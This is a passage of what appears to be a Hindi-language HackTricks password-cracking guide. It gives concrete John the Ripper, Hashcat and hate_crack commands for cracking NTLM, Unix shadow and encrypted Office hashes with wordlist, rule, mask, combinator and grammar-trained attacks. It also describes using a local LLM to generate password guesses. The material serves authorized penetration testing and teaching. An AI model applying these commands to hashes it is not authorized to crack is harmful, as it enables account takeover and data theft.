
**Hash उदाहरण:** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)

### Hash-identifier

```bash
hash-identifier
> <HASH>
```

### Wordlists

- **Rockyou**
- [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
- [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
- [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)

### **Wordlist Generation Tools**

- [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** कॉन्फ़िगर किए जा सकने वाले base chars, keymap और routes वाला उन्नत keyboard-walk जनरेटर।

```bash
kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
```

### John mutation

_**/etc/john/john.conf**_ पढ़ें और इसे कॉन्फ़िगर करें

```bash
john --wordlist=words.txt --rules --stdout > w_mutated.txt
john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
```

### Hashcat

#### Hashcat attacks

- **Wordlist attack** (`-a 0`) with rules

**Hashcat** में पहले से ही **rules वाला एक folder** मौजूद है, लेकिन आप [**यहाँ अन्य दिलचस्प rules पा सकते हैं**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).

```
hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
```

#### rule files की व्याख्या और प्रोफाइलिंग

Hashcat rules, opcodes को बाएँ से दाएँ लागू करते हैं। जब operations position zero पर काम करते हैं, तो इसे आसानी से गलत समझा जा सकता है: `^e ^h ^t` पहले `e`, फिर `h`, और फिर `t` को शुरुआत में जोड़ता है, इसलिए `password` बदलकर `thepassword` हो जाता है। Substitutions, case-sensitive byte comparisons होते हैं, इसलिए `sa@` जैसा rule uppercase `A` के लिए कोई बदलाव नहीं करता। GPU पर समय लगाने से पहले अपरिचित rules को representative lowercase, uppercase और mixed-case basewords पर test करें।<sup>[[6]](#references)[[9]](#references)</sup>

[HashcatRosetta](https://github.com/bandrel/HashcatRosetta) हर intermediate candidate दिखा सकता है और पूरी rule file में opcodes के distribution का सारांश दे सकता है। Static opcode counts से पता चलता है कि कोई file मुख्य रूप से characters को जोड़ती है, शुरुआत में जोड़ती है, substitute करती है या truncate करती है। इससे यह साबित नहीं होता कि कोई rule password crack करेगा, लेकिन इससे ऐसा rule set चुनने में मदद मिलती है जो target population में देखे गए password patterns से मेल खाता हो।<sup>[[6]](#references)[[9]](#references)</sup>

```bash
uv tool install git+https://github.com/bandrel/HashcatRosetta.git
hashcat-rosetta --explain '^e ^h ^t' --baseword password
hashcat-rosetta rules.rule --analyze-rules
```

#### Debug logs के साथ redundant rules कम करें

Hashcat debug mode, सामान्य status और result output से अलग rule transformations रिकॉर्ड करता है। Mode `4` में `baseword:rule:candidate` लिखा जाता है; mode `5` में source wordlist भी जोड़ी जाती है। हमेशा `--debug-file` स्पष्ट रूप से सेट करें। अन्यथा Hashcat अपनी profile directory में `hashcat.debugfile` खोलता है, और stdout को redirect करने पर इन रिकॉर्ड्स के बजाय console stream कैप्चर होती है। Debug files append mode में खोली जाती हैं, इसलिए नया measurement शुरू करने से पहले पुरानी file हटाएँ या rotate करें। इसे सुरक्षित रखें, क्योंकि इसमें plaintext basewords और candidates होते हैं।<sup>[[7]](#references)[[8]](#references)[[9]](#references)</sup>

```bash
rm -f debug.txt
hashcat -m 1000 -a 0 --debug-mode 5 --debug-file debug.txt \
  -r rules.rule hashes.txt wordlist.txt
hashcat-rosetta debug.txt --rules --metric candidates --top 25
hashcat-rosetta debug.txt --basewords --detail
hashcat-rosetta debug.txt --wordlists --detail
hashcat-rosetta debug.txt --export report.json --format json
```

`frequency` का उपयोग सबसे अधिक लागू किए गए rules खोजने के लिए, `basewords` का उपयोग अलग-अलग input coverage मापने के लिए, और `candidates` का उपयोग अलग-अलग outputs गिनने के लिए करें। Candidate ranking आमतौर पर trimming शुरू करने का सबसे अच्छा तरीका है, क्योंकि कोई rule अक्सर लागू होने के बावजूद कई inputs को duplicate candidates में बदल सकता है। सबसे अधिक उपयोगी rules को एक छोटी file में कॉपी करें, उसे बाकी hashes पर फिर से चलाएँ, और दोनों runs की reports की तुलना करें। Mode `5` यह भी दिखाता है कि हर source wordlist कितने उपयोगी basewords देता है; जब data में colons होने से automatic detection अस्पष्ट हो, तो parsing को बाध्य करने के लिए `--debug-mode 4` या `--debug-mode 5` का उपयोग करें।<sup>[[6]](#references)[[9]](#references)</sup>

- **Wordlist combinator** attack

hashcat से **2 wordlists को मिलाकर 1 में बदलना** संभव है।\
अगर list 1 में **"hello"** शब्द हो और दूसरी में **"world"** और **"earth"** शब्दों वाली 2 lines हों, तो `helloworld` और `helloearth` शब्द generate होंगे।

```bash
# This will combine 2 wordlists
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt

# Same attack as before but adding chars in the newly generated words
# In the previous example this will generate:
## hello-world!
## hello-earth!
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
```

#### Grammar-driven combinator attacks (encrypted Office उदाहरण)

कोई पासवर्ड लंबा हो सकता है और उसमें कई character classes हो सकती हैं, फिर भी अगर वह किसी ज्ञात grammar का पालन करता है, तो उसका **effective search space** छोटा हो सकता है। अधिकृत assessment के दौरान प्राप्त encrypted Office document के लिए, `office2john.py` पासवर्ड-सत्यापन रिकॉर्ड निकालता है; इससे online lockouts, throttling या MFA के बिना local guessing संभव होती है। यह document encryption को bypass नहीं करता।<sup>[[2]](#references)[[5]](#references)</sup>

John द्वारा जोड़ा गया filename field हटाएँ, ताकि Hashcat को केवल verifier मिले:<sup>[[2]](#references)</sup>

```bash
python3 /path/to/office2john.py secrets.xlsx | sed 's/^[^:]*://' > office.hash
head -c 40 office.hash; echo
```

फ़ाइल extension के बजाय extracted prefix से `-m` चुनें। Hashcat `$office$*2007*`, `$office$*2010*` और `$office$*2013*` को क्रमशः modes `9400`, `9500` और `9600` से जोड़ता है; legacy `$oldoffice$0/$1` और `$oldoffice$3/$4` records क्रमशः modes `9700` और `9800` का उपयोग करते हैं।<sup>[[3]](#references)</sup>

यदि password reuse, policies, hints या user से परिचित लोगों से मिली जानकारी से `<word><number><optional !><word>` जैसा grammar पता चलता है, तो स्वतंत्र रूप से enumerate किए जा सकने वाले prefix को left dictionary के रूप में तैयार करें। यह उदाहरण `0` से `99` तक की संख्याएँ जाँचता है; range और transformations को assessment से मिले साक्ष्यों के अनुसार बदलें।<sup>[[5]](#references)</sup>

```bash
while IFS= read -r word; do
  for number in $(seq 0 99); do
    printf '%s%s\n%s%s!\n' "$word" "$number" "$word" "$number"
  done
done < words.txt > wordsAndNumbers.txt
```

Hashcat attack mode `1` right dictionary की हर line को left dictionary की हर line के अंत में जोड़ता है, इसलिए `L` और `R` lines वाली files से लागू किए गए rules से पहले `L × R` candidates बनते हैं। निम्न command विशेष रूप से legacy `$oldoffice$3/$4` record के लिए है; अन्य Office formats के लिए mode बदलें।<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

```bash
hashcat -m 9800 -a 1 office.hash wordsAndNumbers.txt english-88k-upper.txt
```

यह preprocessing pattern अन्य offline-verifiable formats पर भी लागू होता है: किसी एक component के लिए केवल संभावित capitalization, dates, separators, digits या punctuation को enumerate करें, फिर nominal full length को brute-force करने के बजाय उसे बाकी component के साथ combine करें।<sup>[[4]](#references)[[5]](#references)</sup>

- **Mask attack** (`-a 3`)

```bash
# Mask attack with simple mask
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d

hashcat --help #will show the charsets and are as follows
? | Charset
===+=========
l | abcdefghijklmnopqrstuvwxyz
u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
d | 0123456789
h | 0123456789abcdef
H | 0123456789ABCDEF
s | !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
a | ?l?u?d?s
b | 0x00 - 0xff

# Mask attack declaring custom charset
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
## -1 ?d?s defines a custom charset (digits and specials).
## ?u?l?l?l?l?l?l?l?1 is the mask, where "?1" is the custom charset.

# Mask attack with variable password length
## Create a file called masks.hcmask with this content:
?d?s,?u?l?l?l?l?1
?d?s,?u?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?l?1
## Use it to crack the password
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
```

#### run से पहले `.hcmask` फ़ाइलों को validate करें

कोई malformed line मान्य masks के बीच छूट सकती है, इसलिए attack शुरू करने से पहले पूरी फ़ाइल और उसके estimated keyspace को validate करें। HashcatRosetta विफल line की जानकारी देता है और कोई भी mask अमान्य होने पर non-zero status लौटाता है, जिससे यह जाँच scripts या CI के लिए उपयुक्त बनती है।<sup>[[6]](#references)[[9]](#references)</sup>

```bash
hashcat-rosetta masks.hcmask --verify-masks
```

Mask files को generic CSV या text parsers से normalize न करें। Hashcat custom charsets `?1` से `?8` तक सपोर्ट करता है, `#` को comment तभी मानता है जब वह पहला byte हो, और `?` tokens को interpret करने से पहले एक pass में backslash escapes हटा देता है। इसलिए `#` से पहले का whitespace mask data होता है, और escaping यह बदल सकती है कि कोई sequence literal है या charset token।<sup>[[6]](#references)[[9]](#references)</sup>

- Wordlist + Mask (`-a 6`) / Mask + Wordlist (`-a 7`) attack

```bash
# Mask numbers will be appended to each word in the wordlist
hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d

# Mask numbers will be prepended to each word in the wordlist
hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
```

#### hate_crack के साथ लक्ष्य-आधारित Hashcat पास

[hate_crack](https://github.com/trustedsec/hate_crack) आपके पास hash file होने और उसका Hashcat mode पता होने के बाद स्थानीय Hashcat पास चलाता है। Hashcat को अलग से install करना होगा। Submodules के साथ clone करें, `make` चलाएँ, फिर interactive session शुरू करें; उदाहरण में दिया गया mode `1000` NTLM है, सार्वभौमिक default नहीं। PCFG और PRINCE-LING विकल्पों का उपयोग करने से पहले मौजूदा clones में `git submodule update --init --recursive` चलाना होगा।<sup>[[13]](#references)[[14]](#references)</sup>

```bash
git clone --recurse-submodules https://github.com/trustedsec/hate_crack.git
cd hate_crack
make
hate_crack hashes.txt 1000
```

**प्राप्त plaintexts से grammar सीखें।** पहले dictionary/rule pass चलाएँ, फिर target-relevant plaintexts पर `pcfg_cracker` को train करें। `config.json` में `pcfgRuleset` को trained ruleset पर सेट करें और संभावित structures को Hashcat में stream करने के लिए PCFG (menu `20`) चुनें, या grammar-guided PRINCE base list बनाने के लिए PRINCE-LING (`21`) चुनें। दोनों generators को `pcfgMaxCandidates` और `pcfgPrinceLingMaxCandidates` से सीमित करें; hate_crack आपके लिए grammar train नहीं करता। PCFG, baseword के बाद digits और symbols जैसी structures की probability सीखता है—इसके विपरीत, [combinator example](#grammar-driven-combinator-attacks-encrypted-office-example) में fixed grammar इस्तेमाल होती है।<sup>[[10]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
cd pcfg_cracker
python3 trainer.py -t ../target-plaintexts.txt -r TARGET
cd ..
# Set pcfgRuleset to TARGET in config.json, then select 20 or 21.
hate_crack hashes.txt 1000
```

**ज्ञात passwords से rules को उल्टी दिशा में निकालें।** Spoonman (menu `22`) एक plaintext corpus लेता है, जिसमें मौजूदा session की nonempty `.out` file भी शामिल होती है, और देखे गए passwords को फिर से बनाने वाले lowercase letter basewords और Hashcat rules निकालता है। यह rules को उन corpus passwords की संख्या के आधार पर rank करता है जिन्हें वे reproduce करते हैं। Top-50%-coverage tier से शुरू करें और तभी आगे बढ़ें जब जोड़ा गया keyspace उचित हो; जब coverage mutation के बजाय missing stem से सीमित हो, तो निकाले गए basewords को अन्य relevant wordlists के साथ मिलाएँ। Hashcat एक rule में अधिकतम 31 functions स्वीकार करता है और इसका position alphabet केवल `0`–`35` indices को संबोधित करता है; जब किसी password को encode नहीं किया जा सकता, तो Spoonman literal baseword और no-op rule इस्तेमाल करता है। बहुत बड़े corpora इसकी bounded-memory counter cap तक पहुँच सकते हैं, इसलिए पूरी reconstruction मान लेने के बजाय रिपोर्ट की गई coverage देखें। Output को स्वतंत्र रूप से दोबारा इस्तेमाल करने से पहले [Hashcat rule behavior](#explain-and-profile-rule-files) देखें।<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>

**उपलब्ध evidence के अनुसार generator चुनें।** OMEN (`13`) password list से character-transition model train करता है और `omenMaxCandidates` द्वारा सीमित, probability के क्रम में candidates enumerate करता है। इसके बजाय Markov brute force (`15`) मौजूदा `.out` cracks या चुनी हुई list से `.hcstat2` table बना सकता है और incremental length range जाँच सकता है। जब target intelligence passwords के बजाय prose हो, तो N-gram (`16`) `ngramX.bin` को corpus देता है, जिसमें gzip input भी शामिल है; इसका default group size तीन है। ये विकल्प हैं, एक ही candidate list की तीन प्रतियाँ नहीं।<sup>[[11]](#references)[[13]](#references)[[14]](#references)</sup>

**केवल छोटे और संभावित pools का विस्तार करें।** Permutation (`17`) हर input word के सभी characters का क्रम बदलता है, इसलिए एक आठ-character word से भी `8!` orderings बनते हैं। Combipow (`19`) छोटे passphrase word pool से nonempty subset combinations निकालता है; `-s` spaces जोड़ता है और tool 63 से अधिक input lines अस्वीकार करता है। Combinator (`6`) `--sepFill` के ज़रिए कई wordlists को separators के साथ जोड़ सकता है; सामान्य two-list concatenation के लिए ऊपर दिया गया [native Hashcat combinator](#hashcat-attacks) इस्तेमाल करें।<sup>[[13]](#references)[[14]](#references)</sup>

**Feedback attacks के लिए budget तय करें।** Fingerprint (`5`) हर round में पूरे corpus को फिर से expand करने के बजाय, बढ़ती fragment lengths के साथ नए cracked passwords का क्रमिक विस्तार करता है; इसका combination keyspace threshold बहुत बड़ा `-a 1` pass छोड़ देता है। Hybrid (`7`) व्यापक `?a` prepend/append masks आज़माने से पहले कम खर्चीली `?s?d` decorations आज़माता है; `hcatHybridMaxRuntime` run की अवधि सीमित करता है। यह इसलिए महत्वपूर्ण है क्योंकि hybrid pass की लागत wordlist size को mask space से गुणा करने पर निर्भर करती है, इसलिए बड़ी list पर व्यापक mask शुरुआती passes से कहीं अधिक महँगा हो सकता है।<sup>[[13]](#references)[[14]](#references)</sup>

**Recovered passwords से local LLM की मदद से candidates बनाएँ।** शुरुआती pass से nonempty `<hashfile>.out` बनने के बाद, hate_crack का LLM attack (main menu `12`, **Cracked passwords** submenu `3`) target-specific basewords, years, suffixes और casing का अनुमान लगा सकता है, फिर नए candidates Hashcat को भेज सकता है। छोटे corpora में model prompt के भीतर recovered plaintexts शामिल हो सकते हैं; बड़े corpora को इसके बजाय statistics में summarize किया जाता है। यह ऊपर दिए गए तयशुदा [rules](#explain-and-profile-rule-files) या [masks](#hashcat-attacks) को केवल दोहराने के बजाय देखे गए conventions को generalize करता है।<sup>[[13]](#references)[[14]](#references)</sup>

hate_crack की `.env` में पहले से serve किए जा रहे local Ollama model को configure करें; यह model को अपने-आप pull नहीं करता। `OLLAMA_NO_CLOUD=true` cloud-tagged models और offsite endpoint addresses को अस्वीकार करता है। केवल localhost endpoint पर्याप्त नहीं है: Ollama `-cloud` model को remotely proxy कर सकता है, और prompts में recovered plaintexts या corpus statistics हो सकते हैं। यह setting फिर भी private-network endpoints की अनुमति देती है और transport proxy को खारिज नहीं कर सकती, इसलिए client data भेजने से पहले inference path सत्यापित करें।<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>

```dotenv
LLM_BACKEND=ollama
OLLAMA_HOST=localhost:11434
OLLAMA_MODEL=qwen3:4b-instruct
OLLAMA_NO_CLOUD=true
```

```bash
hate_crack hashes.txt 1000
# Select 12 (LLM Attack), then 3 (Cracked passwords).
```

कम लागत वाले rule, mask और target-प्रशिक्षित passes आज़माने के बाद candidate yield की तुलना करें, फिर बड़ा budget आवंटित करें। मॉडल guesses बनाता है; Hashcat फिर भी उन्हें hashes के विरुद्ध जाँचता है।<sup>[[13]](#references)[[14]](#references)</sup>

#### Hashcat मोड

```bash
hashcat --example-hashes | grep -B1 -A2 "NTLM"
```

Linux Hashes Cracking - /etc/shadow फ़ाइल

```
 500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
```

Cracking Windows Hashes

```
3000 | LM                                               | Operating-Systems
1000 | NTLM                                             | Operating-Systems
```

सामान्य एप्लिकेशन Hashes की Cracking

```
  900 | MD4                                              | Raw Hash
    0 | MD5                                              | Raw Hash
 5100 | Half MD5                                         | Raw Hash
  100 | SHA1                                             | Raw Hash
10800 | SHA-384                                          | Raw Hash
 1400 | SHA-256                                          | Raw Hash
 1700 | SHA-512                                          | Raw Hash
```

## References

- [1] [GoBruteforcer के अंदर: AI-जनरेटेड सर्वर डिफ़ॉल्ट, कमज़ोर पासवर्ड और crypto-केंद्रित अभियान](https://research.checkpoint.com/2026/inside-gobruteforcer-ai-generated-server-defaults-weak-passwords-and-crypto-focused-campaigns/)
- [2] [John the Ripper: `office2john.py`](https://github.com/openwall/john/blob/bleeding-jumbo/run/office2john.py)
- [3] [Hashcat के उदाहरण हैश और Microsoft Office मोड](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [4] [Hashcat combinator attack](https://hashcat.net/wiki/doku.php?id=combinator_attack)
- [5] [क्रेडेंशियल्स की एस्टेट प्लानिंग](https://pentestpartners.com/security-blog/estate-planning-of-credentials)
- [6] [HashcatRosetta repository](https://github.com/bandrel/HashcatRosetta)
- [7] [Hashcat debug-file implementation](https://github.com/hashcat/hashcat/blob/master/src/debugfile.c)
- [8] [Hashcat command-line help](https://github.com/hashcat/hashcat/blob/master/docs/hashcat-help.md)
- [9] [HashcatRosetta: Password Cracking के Rosetta Stone को समझना](https://trustedsec.com/blog/hashcatrosetta-reading-the-rosetta-stone-of-password-cracking)
- [10] [PCFG Cracker repository और उपयोग](https://github.com/lakiw/pcfg_cracker)
- [11] [OMEN repository और उपयोगकर्ता मार्गदर्शिका](https://github.com/RUB-SysSec/OMEN)
- [12] [Spoonman का मूल issue और rule derivation डिज़ाइन](https://github.com/trustedsec/hate_crack/issues/169)
- [13] [hate_crack repository और attack दस्तावेज़](https://github.com/trustedsec/hate_crack)
- [14] [2.0 के बाद hate_crack में नया क्या है](https://trustedsec.com/blog/whats-new-in-hate-crack-since-2-0)
- [15] [hate_crack LLM destination policy](https://github.com/trustedsec/hate_crack/blob/main/hate_crack/llm.py)
{{#include ../banners/hacktricks-training.md}}
